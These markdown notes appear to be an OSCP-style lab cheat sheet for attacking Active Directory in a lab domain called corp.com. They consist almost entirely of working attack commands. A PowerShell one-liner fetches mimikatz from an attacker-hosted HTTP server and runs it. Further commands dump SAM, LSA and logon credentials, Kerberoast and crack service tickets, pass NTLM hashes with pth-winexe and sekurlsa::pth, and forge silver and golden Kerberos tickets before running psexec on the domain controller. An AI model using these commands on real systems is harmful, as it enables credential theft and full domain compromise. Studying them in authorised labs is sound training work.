# Cached Credential Storage and Retrieval
- Setup Kali to host `mimikatz`
```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```
- Download and run `mimikatz` on host machine
  - Download: `(New-Object System.Net.WebClient).DownloadFile()`
  - Run: `Start-Process`
```console
powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
```
- mimikatz commands
```console
privilege::debug
token::elevate
lsadump::sam
lsadump::lsa /patch
sekurlsa::logonpasswords
```

# Service Account Attack (Kerberoasting)
```console
kerberos::list /export
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

# Pass the Hash

## pth-winexe
```console
pth-winexe -U offsec%00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
## mimikatz - sekurlsa::pth
```console
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe
```

# Silver Ticket
```console
kerberos::purge
kerberos::list
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
kerberos::list
```

# Golden Ticket
```console
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd
psexec.exe \\dc01 cmd.exe
```
